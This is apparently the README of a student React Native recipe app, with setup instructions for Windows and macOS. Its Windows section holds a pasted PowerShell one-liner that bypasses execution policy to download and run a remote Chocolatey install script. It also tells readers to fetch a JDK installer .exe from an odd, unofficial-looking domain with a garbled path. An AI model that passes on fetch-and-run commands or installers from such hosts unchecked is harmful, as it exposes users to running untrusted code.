![NodeJS Testing](https://github.com/stevenpl98/FoodUniversity/workflows/NodeJS%20Testing/badge.svg)

# Food University

## Introduction
For many college students, living on campus is their first experience with independence. With that requires them being able to handle all facets of daily life, the most essential being handling meals. Many of the problems that are associated with this revolve around little to no experience with cooking, and ready made meals being so expensive. Making home made meals can reduce food expenses by hundreds of dollars a month, but this can be incredibly daunting to the inexperienced. With our app, students will have access to a large selection of recipes

## Features
1. New user account creation authenticated with Firebase
2. View pre-listed recipes of specific food items
3. View recipe title with picture/s
4. View recipe ingredients with pictures
5. View list of equipment needed for recipse preparation
6. View recipe instructions
7. View recipe ready time
8. View servings and cost per serving
9. Search for recipes based on cuisine
10. Search for recipes based on food content (chicken, pasta, etc.)


## Getting Started

### Installation and Setup (varies by OS)

#### Windows
You will need Node, the React Native command line interface, JDK, and Android Studio.

While you can use any editor of your choice to develop your app, you will need to install Android Studio in order to set up the necessary tooling to build your React Native app for Android.

##### Install Choco

Open command line as an administrator and paste in the script below:

`@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command " [System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin"`

##### Install Nodejs

Go to https://nodejs.org/download/release/v12.9.1/node-v12.9.1-win-x64.zip , download the zip file, extract and run the installer within.

##### JDK
Recent versions or versions too old are tricky to make the project work so I found that in Windows 10.0.1 seemed to work for me.

Go to https://www.sesasu-guffh.com/a3cnco*6oodzv/jdk-10.0.1_windows-x64_bin.exe 

Follow through the first install until it extracts the installer. Then continue in the second installer so that it can install jdk and jre to the appropriate location.

##### Android development environment
Setting up your development environment can be somewhat tedious if you're new to Android development. If you're already familiar with Android development, there are a few things you may need to configure. In either case, please make sure to carefully follow the next few steps.

1. Install Android Studio

    Download and install Android Studio. Choose a "Custom" setup when prompted to select an installation type. Make sure the boxes next to all of the following are checked:

    * Android SDK
    * Android SDK Platform
    * Performance (Intel ® HAXM) (See here for AMD)
    * Android Virtual Device


    Then, click "Next" to install all of these components.

    If the checkboxes are grayed out, you will have a chance to install these components later on.

    Once setup has finalized and you're presented with the Welcome screen, proceed to the next step.

2. Android Studio installs the latest Android SDK by default. Building a React Native app with native code, however, requires the Android 9 (Pie) SDK in particular. Additional Android SDKs can be installed through the SDK Manager in Android Studio.

    The SDK Manager can be accessed from the "Welcome to Android Studio" screen. Click on "Configure", then select "SDK Manager". The SDK Manager can also be found within the Android Studio "Preferences" dialog, under Appearance & Behavior → System Settings → Android SDK.

    Select the "SDK Platforms" tab from within the SDK Manager, then check the box next to "Show Package Details" in the bottom right corner. Look for and expand the Android 9 (Pie) entry, then make sure the following items are checked:
    * Android SDK Platform 28 or greater
    * Intel x86 Atom_64 System Image or Google APIs Intel x86 Atom System Image

    Next, select the "SDK Tools" tab and check the box next to "Show Package Details" here as well. Look for and expand the "Android SDK Build-Tools" entry, then make sure that version 28.0.3 or greater is selected.

    Finally, click "Apply" to download and install the Android SDK and related build tools.

3. Configure the environment variables

    The React Native tools require some environment variables to be set up in order to build apps with native code.

    Hit the Start button on your keyboard and start typing:

    `environmental`

    "Edit the system environment variables" should be in the result list, hit enter and you will be in the envrionment variable settings.

    Go to the first list under User Variables for *your user account name* and click "new' and set a variable with the variable name and value(change "perezs4" to your computer user account name) as highlighted in blue in the picture below and then click "ok" when done.

    ![User Variables](https://raw.githubusercontent.com/stevenpl98/FoodUniversity/testing/initial/images/User%20Variables.png)

    Double-click on the row with Variable name "Path as shown in the picture above. Click "new' and type the directory(change "perezs4" to your computer user account name) as highlighted in blue in the picture below and then click "ok" when done. 

    ![User Variables Path](https://raw.githubusercontent.com/stevenpl98/FoodUniversity/testing/initial/images/User%20Variables%20Path.png)

    Go down to the second list under System Variables, and click "new' and set a variable with the variable name and value(change "perezs4" to your computer user account name) as highlighted in blue in the picture below and then click "ok" when done.

    ![System Variables](https://raw.githubusercontent.com/stevenpl98/FoodUniversity/testing/initial/images/System%20Variables.png)

    Double-click on the row with Variable name "Path as shown in the picture above. Click "new' and type the directory(change "perezs4" to your computer user account name) as highlighted in blue in the picture below and then click "ok" when done. 

    ![System Variables Path](https://raw.githubusercontent.com/stevenpl98/FoodUniversity/testing/initial/images/System%20Variables%20Path.png)

---
---
#### Mac OS

You will need Node, Watchman, the React Native command line interface, JDK, and Android Studio. While you can use any editor of your choice to develop your app, you will need to install Android Studio in order to set up the necessary tooling to build your React Native app for Android.
<br>
<br>
##### Node & Watchman<br>
We recommend installing Node and Watchman using Homebrew. Run the following commands in a Terminal after installing Homebrew:

`brew install node`
<br>
`brew install watchman`
<br>
<br>
If you have already installed Node on your system, make sure it is Node 8.3 or newer. Watchman is a tool by Facebook for watching changes in the filesystem. It is highly recommended you install it for better performance.

##### JDK
Go to https://www.oracle.com/java/technologies/javase-downloads.html and install a JDK version 8 or higher from the choices for osx. If you have already installed JDK on your system, make sure it is JDK 8 or newer.

##### Android development environment

1. Download and install Android Studio from https://developer.android.com/studio/index.html. Choose a "Custom" setup when prompted to select an installation type. Make sure the boxes next to all of the following are checked:

    * Android SDK
    * Android SDK Platform
    * Performance (Intel ® HAXM) (See here for AMD)
    * Android Virtual Device

    Then, click "Next" to install all of these components.

2. Android Studio installs the latest Android SDK by default. Building a React Native app with native code, however, requires the Android 9 (Pie) SDK in particular. Additional Android SDKs can be installed through the SDK Manager in Android Studio.

    The SDK Manager can be accessed from the "Welcome to Android Studio" screen. Click on "Configure", then select "SDK Manager". The SDK Manager can also be found within the Android Studio "Preferences" dialog, under Appearance & Behavior → System Settings → Android SDK.

    Select the "SDK Platforms" tab from within the SDK Manager, then check the box next to "Show Package Details" in the bottom right corner. Look for and expand the Android 9 (Pie) entry, then make sure the following items are checked:
    * Android SDK Platform 28 or greater
    * Intel x86 Atom_64 System Image or Google APIs Intel x86 Atom System Image

    Next, select the "SDK Tools" tab and check the box next to "Show Package Details" here as well. Look for and expand the "Android SDK Build-Tools" entry, then make sure that version 28.0.3 or greater is selected.

    Finally, click "Apply" to download and install the Android SDK and related build tools.

3. Configure the ANDROID_HOME environment variable
    The React Native tools require some environment variables to be set up in order to build apps with native code.

    Add the following lines to your $HOME/.bash_profile or $HOME/.bashrc config file:

    ```export ANDROID_HOME=$HOME/Library/Android/sdk
    export PATH=$PATH:$ANDROID_HOME/emulator
    export PATH=$PATH:$ANDROID_HOME/tools
    export PATH=$PATH:$ANDROID_HOME/tools/bin
    export PATH=$PATH:$ANDROID_HOME/platform-tools
    ```

    .bash_profile is specific to bash. If you're using another shell, you will need to edit the appropriate shell-specific config file.

    Please make sure you use the correct Android SDK path. You can find the actual location of the SDK in the Android Studio "Preferences" dialog, under Appearance & Behavior → System Settings → Android SDK.

##### Create Android Emulator & Running Emulator
You will usually have to create an Android Studio Project only for the first time and keep it around so that you can access the emulator. 

If you already have an emulator set up start at step 7.

1. Open Android Studio
2. Go to Configure > AVD Manager
3. Click Create Virtual Device, at the bottom of the AVD Manager dialog. The Select Hardware page appears.
4. Choose you android phone emulator device of choice
5. Select the system image for API level 28, and then click Next.
6. Click finish
7. Before running app you have 2 choices:
    *  Run the emululator from Android Studio and continue to step 8
    *  Or if you're like me, run a script from your terminal of preference and skip to step 11
8. Open Android Studio, go to Configure > AVD Manager or repeat step 6 if you have created a project
9. Click the green play button at the right of your emulator of choice
10. The emulator should start booting up soon and keep it running
11. Open your terminal of choice then (other than cmd in Windows):

    **Keep in mind that the in the second line ' _ ' represents a space in the name of your emulator**
    * For Mac OS   
        
        `cd ~/Library/Android/sdk/emulator/`

        `./emulator -avd Pixel_3_XL_API_28`

    * For Windows (once the emulator starts booting up, close the terminal window)
        
        `cd ~/AppData/Local/Android/sdk/emulator`
        
        `./emulator -avd Pixel_3_XL_API_28`
12. Keep the emulator running


### Run
First download and extract or clone this repository above.

Now, for both Mac OS and Windows, running the app is pretty much the same.

* From Android Studio run the emulator, and run your android emulator
* Find the directory to the folder FoodUniversity
* Open your terminal of choice
* Type in `cd` `directory` and hit enter
* Now that you are in the app's directory, type the follwoing commands and then hit enter after each:

    `npm install` - installs node modules

    `npm start` - starts js server

    then in a new terminal window...

    `npx react-native run-android` - builds and runs the app

* The app should then start building and then running on your emulator's screen

## Demo video

Check out our demo video on youtube below:

<a href="http://www.youtube.com/watch?feature=player_embedded&v=YOUTUBE_VIDEO_ID_HERE
" target="_blank"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" 
alt="Food University Demo" width="240" height="180" border="10" /></a>

## Contributors

* Steven Perez- Team Lead, Back-End, Front-End & Testing
* Nick Burke- Front-End & Back-End
* Wajih Khawaja- Front-End & Back-End
* Reymond Kabuye- Front-End & Back-End

